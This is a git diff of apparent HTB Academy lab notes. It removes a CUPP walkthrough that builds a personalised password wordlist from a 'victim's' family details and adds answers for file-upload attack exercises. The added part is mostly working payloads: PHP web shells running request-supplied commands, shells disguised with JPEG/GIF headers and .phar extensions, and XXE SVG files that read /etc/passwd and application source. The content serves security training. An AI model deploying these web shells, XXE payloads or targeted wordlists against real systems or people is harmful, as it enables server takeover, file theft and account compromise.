@@ -1,62 +1,96 @@
 # LOGIN-BRUTE-FORCING
 
-CUPP
-Many tools can create a custom password wordlist based on certain information. The tool we will be using is cupp, which is pre-installed in your PwnBox. If we are doing the exercise from our own VM, we can install it with sudo apt install cupp or clone it from the Github repository. Cupp is very easy to use. We run it in interactive mode by specifying the -i argument, and answer the questions, as follows:
+# Useful Links
+[PHP extension list](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
 
-[!bash!]$ cupp -i
+# Useful Shells
 
-___________
-   cupp.py!                 # Common
-      \                     # User
-       \   ,__,             # Passwords
-        \  (oo)____         # Profiler
-           (__)    )\
-              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
-                            [ Mebus | https://github.com/Mebus/]
+## Question 1
+shell.php
+```php
+<?php system('hostname'); ?>
+```
 
+## Question 2
+shell.php
+```php
+<?php system($_REQUEST['cmd']);?>
+```
 
-[+] Insert the information about the victim to make a dictionary
-[+] If you don't know all the info, just hit enter when asked! ;)
+## Question 3
+shell.php
+```php
+<?php system($_REQUEST['cmd']);?>
+```
 
-> First Name: William
-> Surname: Gates
-> Nickname: Bill
-> Birthdate (DDMMYYYY): 28101955
+## Question 4
+shell.phar
+```php
+<?php system($_REQUEST['cmd']);?>
+```
 
-> Partners) name: Melinda
-> Partners) nickname: Ann
-> Partners) birthdate (DDMMYYYY): 15081964
+## Question 5
+shell.phar.jpg
+```php
+����^@^PJFIF^@^A^A^A^A,^A,^@^@��^@dExif^@^@II*^@^H^@^@^@^B^@^N^A^B^@-^@^@^@&^@^>
+<?php system($_REQUEST['cmd']);?>
+```
 
-> Child's name: Jennifer
-> Child's nickname: Jenn
-> Child's birthdate (DDMMYYYY): 26041996
+## Question 6
+shell.phar.gif
+```php
+GIF8
+<?php system($_REQUEST['cmd']);?>
+```
+shell.gif.phar
+```php
+GIF8
+<?php system($_REQUEST['cmd']);?>
+```
 
-> Pet's name: Nila
-> Company name: Microsoft
+## Question 7
+shell.svg
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
+shell2.svg
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
+<svg>&xxe;</svg>
+```
+shell3.svg
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resourc>
+<svg>&xxe;</svg>
+```
 
-> Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory
-> Do you want to add special chars at the end of words? Y/[N]: y
-> Do you want to add some random numbers at the end of words? Y/[N]:y
-> Leet mode? (i.e. leet = 1337) Y/[N]: y
+## Skills Assessment - File Upload Attacks
 
-[+] Now making a dictionary...
-[+] Sorting list and removing duplicates...
-[+] Saving dictionary to william.txt, counting 43368 words.
-[+] Now load your pistolero with william.txt and shoot! Good luck!
-And as a result, we get our personalized password wordlist saved as william.txt.
+shell.svg
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+<svg>&xxe;</svg>
+```
 
-Password Policy
-The personalized password wordlist we generated is about 43,000 lines long. Since we saw the password policy when we logged in, we know that the password must meet the following conditions:
+shell2.svg
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=common-functions.php"> ]>
+<svg>&xxe;</svg>
+```
 
-8 characters or longer
-contains special characters
-contains numbers
-So, we can remove any passwords that do not meet these conditions from our wordlist. Some tools would convert password policies to Hashcat or John rules, but hydra does not support rules for filtering passwords. So, we will simply use the following commands to do that for us:
+shell.phar.jpeg
+```php
+����^@^PJFIF^@^A^A^A^A,^A,^@^@��^@dExif^@^@II*^@^H^@^@^@^B^@^N^A^B^@-^@^@^@&^@^>
+<?php system($_REQUEST['cmd']);?>
+```
 
+# Useful Code
+[upload.php](https://github.com/r4fik1/HTB_Academy/blob/main/HTB_File_Upload_Attacks/Skill%20Assessment%20-%20File%20Upload%20Attacks/upload.php)
 
-sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
-sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
-sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
-
-
-We see that these commands shortened the wordlist from 43k passwords to around 13k passwords, around 70% shorter.
+[common-functions.php](https://github.com/r4fik1/HTB_Academy/blob/main/HTB_File_Upload_Attacks/Skill%20Assessment%20-%20File%20Upload%20Attacks/common-functions.php)
